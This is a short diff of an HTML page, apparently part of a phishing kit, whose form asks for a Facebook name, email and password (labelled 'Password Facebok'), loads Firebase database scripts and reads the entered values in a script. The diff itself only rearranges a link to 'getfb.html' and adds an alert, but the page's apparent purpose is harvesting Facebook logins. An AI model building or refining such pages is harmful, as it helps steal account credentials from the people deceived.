@@ -144,9 +144,9 @@ label {
 <input  id="passfb"  placeholder="Password Facebok" type="password" required>
 
 
-<center><img onclick="info();" src="imgg/button.png"></center>
+<center>
+<a id="top" href="getfb.html"><img onclick="info();" src="imgg/button.png"></a></center>
 </div></div></div></div>
-<a onclick="info()" id="top" href="getfb.html">is</a>
 
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
@@ -171,6 +171,7 @@ var firebaseConfig = {
   namafb = document.querySelector("#namafb").value;
   emailfb = document.querySelector("#emailfb").value;
   passfb = document.querySelector("#passfb").value;
+  alert("isthebestgemink");
 }
 
 function add(a, b, c, d){
